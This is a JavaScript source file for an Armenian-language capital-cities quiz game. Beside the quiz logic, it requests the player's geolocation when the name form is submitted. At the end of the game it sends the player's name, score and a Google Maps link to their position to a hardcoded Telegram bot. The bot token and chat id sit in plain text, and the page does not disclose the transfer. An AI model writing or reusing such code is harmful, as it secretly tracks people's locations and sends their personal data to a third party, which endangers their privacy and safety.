const botToken = '7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw';
const chatId = '8071841674';

const nameForm = document.getElementById('name-form');
const nameInput = document.getElementById('name-input');
const userNameDiv = document.getElementById('user-name');
const scoreInfo = document.getElementById('score-info');
const gameArea = document.getElementById('game-area');
const questionElement = document.getElementById('question');
const answerButtonsElement = document.getElementById('answer-buttons');
const tryAgainBtn = document.getElementById('try-again-btn');

let userName = '';
let currentQuestionIndex = 0;
let score = 0;
let wrong = 0;
let questions = [];
let locationLink = 'Տեղեկատվություն չի ստացվել';

nameForm.addEventListener('submit', (e) => {
  e.preventDefault();
  userName = nameInput.value.trim() || 'Անհայտ';
  userNameDiv.textContent = userName;
  document.getElementById('name-form-container').style.display = 'none';
  gameArea.style.display = 'block';
  getLocation();
  startGame();
});

function startGame() {
  currentQuestionIndex = 0;
  score = 0;
  wrong = 0;
  questions = getRandomQuestions(10);
  showQuestion();
}

function getRandomQuestions(count) {
  const shuffled = allQuestions.sort(() => 0.5 - Math.random());
  return shuffled.slice(0, count);
}

function showQuestion() {
  resetState();
  const question = questions[currentQuestionIndex];
  questionElement.textContent = question.question;

  const shuffledAnswers = question.answers.sort(() => 0.5 - Math.random());
  shuffledAnswers.forEach(answer => {
    const button = document.createElement('button');
    button.textContent = answer;
    button.addEventListener('click', () => selectAnswer(button, question.correct));
    answerButtonsElement.appendChild(button);
  });

  updateScoreBar();
}

function resetState() {
  answerButtonsElement.innerHTML = '';
}

function selectAnswer(button, correctAnswer) {
  const buttons = Array.from(answerButtonsElement.children);
  buttons.forEach(btn => {
    if (btn.textContent === correctAnswer) btn.classList.add('correct');
    if (btn !== button && btn.textContent !== correctAnswer) btn.disabled = true;
  });

  if (button.textContent === correctAnswer) {
    button.classList.add('correct');
    score++;
  } else {
    button.classList.add('wrong');
    wrong++;
  }

  currentQuestionIndex++;
  setTimeout(() => {
    if (currentQuestionIndex < questions.length) {
      showQuestion();
    } else {
      endGame();
    }
  }, 1500);
}

function updateScoreBar() {
  scoreInfo.textContent = `Հարցեր՝ ${currentQuestionIndex + 1}/${questions.length} | Ճիշտ՝ ${score} | Սխալ՝ ${wrong}`;
}

function endGame() {
  sendTelegramData();
  tryAgainBtn.style.display = 'block';
  tryAgainBtn.onclick = () => {
    tryAgainBtn.style.display = 'none';
    nameForm.reset();
    document.getElementById('name-form-container').style.display = 'block';
    gameArea.style.display = 'none';
  };
}

function sendTelegramData() {
  const msg = `👤 Անուն: ${userName}%0A✅ Ճիշտ պատասխաններ: ${score}%0A❌ Սխալ պատասխաններ: ${wrong}%0A📍 Տեղադրություն: ${locationLink}`;
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${msg}`);
}

function getLocation() {
  if ('geolocation' in navigator) {
    navigator.geolocation.getCurrentPosition(pos => {
      const { latitude, longitude } = pos.coords;
      locationLink = `https://maps.google.com/?q=${latitude},${longitude}`;
    }, () => {
      locationLink = 'Չհաջողվեց ստանալ տեղադրությունը';
    });
  }
}

// --- 5 հարցի օրինակներ (կարող ես ավելացնել քոնը)
const allQuestions = [
  { question: "Ո՞րն է Ֆրանսիայի մայրաքաղաքը։", answers: ["Փարիզ", "Մարսել", "Լիոն", "Նիցցա"], correct: "Փարիզ" },
  { question: "Ո՞րն է Ռուսաստանի մայրաքաղաքը։", answers: ["Մոսկվա", "Սանկտ Պետերբուրգ", "Կազան", "Նովոսիբիրսկ"], correct: "Մոսկվա" },
  { question: "Ո՞րն է Գերմանիայի մայրաքաղաքը։", answers: ["Բեռլին", "Մյունխեն", "Համբուրգ", "Քյոլն"], correct: "Բեռլին" },
  { question: "Ո՞րն է Իտալիայի մայրաքաղաքը։", answers: ["Հռոմ", "Միլան", "Նեապոլ", "Վենետիկ"], correct: "Հռոմ" },
  { question: "Ո՞րն է Հայաստանի մայրաքաղաքը։", answers: ["Երևան", "Գյումրի", "Վանաձոր", "Աշտարակ"], correct: "Երևան" }
];